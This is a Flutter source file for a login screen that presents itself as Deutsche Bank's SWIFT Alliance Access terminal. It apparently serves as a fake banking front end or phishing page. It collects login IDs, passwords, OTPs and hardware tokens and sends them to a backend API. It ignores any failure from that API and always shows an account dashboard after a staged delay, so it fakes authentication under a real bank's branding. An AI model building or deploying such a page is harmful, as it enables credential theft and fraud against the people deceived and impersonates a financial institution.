import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';
import '../theme/app_colors.dart';
import '../services/api_service.dart';
import '../widgets/swift_network_background.dart';
import '../widgets/deutsche_bank_logo.dart';
import 'account_dashboard_page.dart';

class DeutscheBankAuthPage extends StatefulWidget {
  const DeutscheBankAuthPage({super.key});

  @override
  State<DeutscheBankAuthPage> createState() => _DeutscheBankAuthPageState();
}

class _DeutscheBankAuthPageState extends State<DeutscheBankAuthPage> {
  // Controllers for SWIFT.COM
  final _comLoginCtrl = TextEditingController();
  final _comPassCtrl = TextEditingController();
  final _comOtpCtrl = TextEditingController();

  // Controllers for SWIFT.NET
  final _netIdCtrl = TextEditingController();
  final _netPassCtrl = TextEditingController();
  final _netTokenCtrl = TextEditingController();

  bool _submittedCom = false;
  bool _submittedNet = false;

  @override
  void dispose() {
    _comLoginCtrl.dispose();
    _comPassCtrl.dispose();
    _comOtpCtrl.dispose();
    _netIdCtrl.dispose();
    _netPassCtrl.dispose();
    _netTokenCtrl.dispose();
    super.dispose();
  }

  void _authenticate({String dashboardType = 'MT 103'}) async {
    final isLayer = dashboardType == 'LAYER';

    setState(() {
      if (isLayer) {
        _submittedNet = true;
      } else {
        _submittedCom = true;
      }
    });

    // Validate fields based on dashboard type
    final bool hasEmptyFields = isLayer
        ? (_netIdCtrl.text.trim().isEmpty || _netPassCtrl.text.isEmpty || _netTokenCtrl.text.trim().isEmpty)
        : (_comLoginCtrl.text.trim().isEmpty || _comPassCtrl.text.isEmpty || _comOtpCtrl.text.trim().isEmpty);

    if (hasEmptyFields) {
      if (!mounted) return;
      ScaffoldMessenger.of(context).clearSnackBars();
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          backgroundColor: const Color(0xFF1F080F),
          behavior: SnackBarBehavior.floating,
          margin: const EdgeInsets.symmetric(horizontal: 40, vertical: 20),
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(4),
            side: const BorderSide(color: Color(0xFFFF3366), width: 1.2),
          ),
          content: Row(
            children: [
              const Icon(Icons.warning_amber_rounded, color: Color(0xFFFF3366), size: 20),
              const SizedBox(width: 12),
              Expanded(
                child: Text(
                  isLayer
                      ? 'ACCESS DENIED: Network ID, Password, and Hardware Token are required.'
                      : 'ACCESS DENIED: Login ID, Password, and Security Token (OTP) are required.',
                  style: GoogleFonts.jetBrainsMono(
                    color: const Color(0xFFFF3366),
                    fontSize: 12,
                    fontWeight: FontWeight.w700,
                    letterSpacing: 0.5,
                  ),
                ),
              ),
            ],
          ),
        ),
      );
      return;
    }

    if (!mounted) return;
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => const Center(child: CircularProgressIndicator(color: AppColors.accentGreen)),
    );

    // Hit API validation
    try {
      if (isLayer) {
        await ApiService.validateAuth(_netIdCtrl.text.trim(), _netPassCtrl.text, _netTokenCtrl.text.trim());
      } else {
        await ApiService.validateAuth(_comLoginCtrl.text.trim(), _comPassCtrl.text, _comOtpCtrl.text.trim());
      }
    } catch (_) {}

    await Future.delayed(const Duration(milliseconds: 1500));

    if (!mounted) return;
    Navigator.of(context).pop();
    Navigator.pushReplacement(
      context,
      MaterialPageRoute(builder: (_) => AccountDashboardPage(dashboardType: dashboardType)),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF03070E),
      body: SwiftNetworkBackground(
        child: Center(
          child: SingleChildScrollView(
            padding: const EdgeInsets.symmetric(horizontal: 40, vertical: 40),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  crossAxisAlignment: CrossAxisAlignment.end,
                  children: [
                    Padding(
                      padding: const EdgeInsets.only(bottom: 2),
                      child: Text(
                        'Deutsche Bank',
                        style: GoogleFonts.inter(
                          fontSize: 32,
                          fontWeight: FontWeight.w800,
                          color: Colors.white,
                          letterSpacing: -0.5,
                          height: 1.0,
                        ),
                      ),
                    ),
                    const SizedBox(width: 14),
                    const DeutscheBankEmblem(
                      size: 52,
                      color: Color(0xFF0055FF),
                      hasGlow: true,
                    ),
                  ],
                ),
                const SizedBox(height: 16),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 6),
                  decoration: BoxDecoration(
                    color: const Color(0xFF04180F),
                    border: Border.all(color: const Color(0xFF00FF66).withValues(alpha: 0.5)),
                    borderRadius: BorderRadius.circular(20),
                  ),
                  child: Row(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      Container(
                        width: 7,
                        height: 7,
                        decoration: const BoxDecoration(
                          color: Color(0xFF00FF66),
                          shape: BoxShape.circle,
                          boxShadow: [
                            BoxShadow(color: Color(0xFF00FF66), blurRadius: 6, spreadRadius: 1),
                          ],
                        ),
                      ),
                      const SizedBox(width: 9),
                      Text(
                        'SWIFT ALLIANCE ACCESS',
                        style: GoogleFonts.jetBrainsMono(
                          fontSize: 11,
                          color: const Color(0xFF00FF66),
                          letterSpacing: 2.5,
                          fontWeight: FontWeight.w700,
                        ),
                      ),
                    ],
                  ),
                ),
                const SizedBox(height: 18),
                Text(
                  'HOST: db-swift.dt.com   |   TERMINAL: T-QU3731',
                  style: GoogleFonts.jetBrainsMono(fontSize: 12, color: const Color(0xFF94A3B8), letterSpacing: 0.6),
                ),
                const SizedBox(height: 5),
                Text(
                  'SECURITY: SAFRA COMPLIANT   |   ALLIANCE ACCESS v7.4.2',
                  style: GoogleFonts.jetBrainsMono(fontSize: 12, color: const Color(0xFF64748B), letterSpacing: 0.6),
                ),
                const SizedBox(height: 14),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 7),
                  decoration: BoxDecoration(
                    border: Border.all(color: const Color(0xFFB45309).withValues(alpha: 0.6)),
                    borderRadius: BorderRadius.circular(3),
                  ),
                  child: Text(
                    'UNAUTHORIZED ACCESS IS A CRIMINAL OFFENSE - © 2026 RSDR',
                    style: GoogleFonts.jetBrainsMono(
                      fontSize: 11,
                      color: const Color(0xFFF59E0B),
                      fontWeight: FontWeight.w600,
                      letterSpacing: 1.1,
                    ),
                  ),
                ),
                const SizedBox(height: 38),
                LayoutBuilder(builder: (context, constraints) {
                  if (constraints.maxWidth > 950) {
                    return Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      crossAxisAlignment: CrossAxisAlignment.center,
                      children: [
                        _buildSwiftComCard(context),
                        Padding(
                          padding: const EdgeInsets.symmetric(horizontal: 22),
                          child: Container(
                            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 8),
                            decoration: BoxDecoration(
                              color: const Color(0xFF070E1A),
                              border: Border.all(color: const Color(0xFF1E293B)),
                              borderRadius: BorderRadius.circular(4),
                            ),
                            child: Text(
                              'OR',
                              style: GoogleFonts.jetBrainsMono(
                                color: const Color(0xFF475569),
                                fontSize: 12,
                                letterSpacing: 1.5,
                                fontWeight: FontWeight.w700,
                              ),
                            ),
                          ),
                        ),
                        _buildSwiftNetCard(context),
                      ],
                    );
                  } else {
                    return Column(
                      children: [
                        _buildSwiftComCard(context),
                        Padding(
                          padding: const EdgeInsets.symmetric(vertical: 20),
                          child: Container(
                            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 8),
                            decoration: BoxDecoration(
                              color: const Color(0xFF070E1A),
                              border: Border.all(color: const Color(0xFF1E293B)),
                              borderRadius: BorderRadius.circular(4),
                            ),
                            child: Text(
                              'OR',
                              style: GoogleFonts.jetBrainsMono(
                                color: const Color(0xFF475569),
                                fontSize: 12,
                                letterSpacing: 1.5,
                                fontWeight: FontWeight.w700,
                              ),
                            ),
                          ),
                        ),
                        _buildSwiftNetCard(context),
                      ],
                    );
                  }
                }),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildSwiftComCard(BuildContext context) {
    return Container(
      width: 420,
      padding: const EdgeInsets.all(28),
      decoration: BoxDecoration(
        color: const Color(0xFF060D18).withValues(alpha: 0.94),
        border: Border.all(color: const Color(0xFF0E3054)),
        borderRadius: BorderRadius.circular(6),
        boxShadow: const [
          BoxShadow(
            color: Color(0x77000000),
            blurRadius: 28,
            spreadRadius: 5,
          ),
          BoxShadow(
            color: Color(0x1200A8FF),
            blurRadius: 20,
            spreadRadius: 1,
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Row(
                children: [
                  Container(
                    width: 3.5,
                    height: 16,
                    color: const Color(0xFF00A8FF),
                  ),
                  const SizedBox(width: 9),
                  Text(
                    'SWIFT.COM',
                    style: GoogleFonts.jetBrainsMono(
                      fontSize: 14.5,
                      fontWeight: FontWeight.w700,
                      color: Colors.white,
                      letterSpacing: 1.2,
                    ),
                  ),
                ],
              ),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                decoration: BoxDecoration(
                  border: Border.all(color: const Color(0xFF00A8FF).withValues(alpha: 0.5)),
                  borderRadius: BorderRadius.circular(4),
                ),
                child: Text(
                  'MT 103',
                  style: GoogleFonts.jetBrainsMono(
                    fontSize: 11,
                    color: const Color(0xFF00A8FF),
                    letterSpacing: 1,
                    fontWeight: FontWeight.w700,
                  ),
                ),
              ),
            ],
          ),
          const SizedBox(height: 24),
          _buildInput('LOGIN ID', 'e.g. 0374', controller: _comLoginCtrl, showError: _submittedCom),
          _buildInput('PASSWORD', 'e.g. **********', isPassword: true, controller: _comPassCtrl, showError: _submittedCom),
          _buildInput('SECURITY TOKEN (OTP)', 'e.g. 345897', isPassword: true, controller: _comOtpCtrl, showError: _submittedCom),
          const SizedBox(height: 10),
          SizedBox(
            width: double.infinity,
            height: 46,
            child: OutlinedButton(
              onPressed: () => _authenticate(dashboardType: 'MT 103'),
              style: OutlinedButton.styleFrom(
                backgroundColor: const Color(0xFF051324),
                side: const BorderSide(color: Color(0xFF00A8FF), width: 1.2),
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(5)),
              ),
              child: Text(
                '[ AUTHENTICATE ]',
                style: GoogleFonts.jetBrainsMono(
                  letterSpacing: 2,
                  fontSize: 13,
                  color: const Color(0xFF00A8FF),
                  fontWeight: FontWeight.w700,
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildSwiftNetCard(BuildContext context) {
    return Container(
      width: 420,
      padding: const EdgeInsets.all(28),
      decoration: BoxDecoration(
        color: const Color(0xFF060D18).withValues(alpha: 0.94),
        border: Border.all(color: const Color(0xFF4A1220)),
        borderRadius: BorderRadius.circular(6),
        boxShadow: const [
          BoxShadow(
            color: Color(0x77000000),
            blurRadius: 28,
            spreadRadius: 5,
          ),
          BoxShadow(
            color: Color(0x12FF3366),
            blurRadius: 20,
            spreadRadius: 1,
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Row(
                children: [
                  Container(
                    width: 3.5,
                    height: 16,
                    color: const Color(0xFFFF3366),
                  ),
                  const SizedBox(width: 9),
                  Text(
                    'SWIFT.NET',
                    style: GoogleFonts.jetBrainsMono(
                      fontSize: 14.5,
                      fontWeight: FontWeight.w700,
                      color: Colors.white,
                      letterSpacing: 1.2,
                    ),
                  ),
                ],
              ),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                decoration: BoxDecoration(
                  border: Border.all(color: const Color(0xFFFF3366).withValues(alpha: 0.5)),
                  borderRadius: BorderRadius.circular(4),
                ),
                child: Text(
                  'LAYER',
                  style: GoogleFonts.jetBrainsMono(
                    fontSize: 11,
                    color: const Color(0xFFFF3366),
                    letterSpacing: 1,
                    fontWeight: FontWeight.w700,
                  ),
                ),
              ),
            ],
          ),
          const SizedBox(height: 24),
          _buildInput('NETWORK ID', 'e.g. 0374', controller: _netIdCtrl, showError: _submittedNet),
          _buildInput('PASSWORD', 'e.g. **********', isPassword: true, controller: _netPassCtrl, showError: _submittedNet),
          _buildInput('HARDWARE TOKEN', 'e.g. YGAOQ DS2E6A69 evapdass', isPassword: true, controller: _netTokenCtrl, showError: _submittedNet),
          const SizedBox(height: 10),
          SizedBox(
            width: double.infinity,
            height: 46,
            child: OutlinedButton(
              onPressed: () => _authenticate(dashboardType: 'LAYER'),
              style: OutlinedButton.styleFrom(
                backgroundColor: const Color(0xFF1E0812),
                side: const BorderSide(color: Color(0xFFFF3366), width: 1.2),
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(5)),
              ),
              child: Text(
                '[ AUTHENTICATE ]',
                style: GoogleFonts.jetBrainsMono(
                  letterSpacing: 2,
                  fontSize: 13,
                  color: const Color(0xFFFF3366),
                  fontWeight: FontWeight.w700,
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildInput(
    String label,
    String hintText, {
    bool isPassword = false,
    required TextEditingController controller,
    bool showError = false,
  }) {
    final hasError = showError && controller.text.trim().isEmpty;

    return Padding(
      padding: const EdgeInsets.only(bottom: 18),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Text(
                label,
                style: GoogleFonts.jetBrainsMono(
                  fontSize: 11,
                  color: hasError ? const Color(0xFFFF3366) : const Color(0xFF64748B),
                  letterSpacing: 1.5,
                  fontWeight: FontWeight.w600,
                ),
              ),
              if (hasError)
                Text(
                  '* REQUIRED FIELD',
                  style: GoogleFonts.jetBrainsMono(
                    fontSize: 9.5,
                    color: const Color(0xFFFF3366),
                    fontWeight: FontWeight.w700,
                    letterSpacing: 1,
                  ),
                ),
            ],
          ),
          const SizedBox(height: 7),
          Container(
            height: 44,
            decoration: BoxDecoration(
              color: const Color(0xFF060B14),
              border: Border.all(
                color: hasError ? const Color(0xFFFF3366) : const Color(0xFF1E293B),
                width: hasError ? 1.2 : 1.0,
              ),
              borderRadius: BorderRadius.circular(4),
              boxShadow: hasError
                  ? [
                      BoxShadow(
                        color: const Color(0xFFFF3366).withValues(alpha: 0.25),
                        blurRadius: 8,
                        spreadRadius: 1,
                      ),
                    ]
                  : null,
            ),
            child: TextFormField(
              controller: controller,
              onChanged: (_) {
                if (hasError) setState(() {});
              },
              obscureText: isPassword,
              style: GoogleFonts.jetBrainsMono(
                color: const Color(0xFFE2E8F0),
                fontSize: 13,
                fontWeight: FontWeight.w500,
              ),
              decoration: InputDecoration(
                isDense: true,
                contentPadding: const EdgeInsets.symmetric(horizontal: 15, vertical: 13),
                hintText: hintText,
                hintStyle: GoogleFonts.jetBrainsMono(
                  color: const Color(0xFF475569),
                  fontSize: 13,
                ),
                border: InputBorder.none,
                enabledBorder: InputBorder.none,
                focusedBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(4),
                  borderSide: BorderSide(
                    color: hasError ? const Color(0xFFFF3366) : const Color(0xFF00A8FF),
                    width: 1.2,
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}
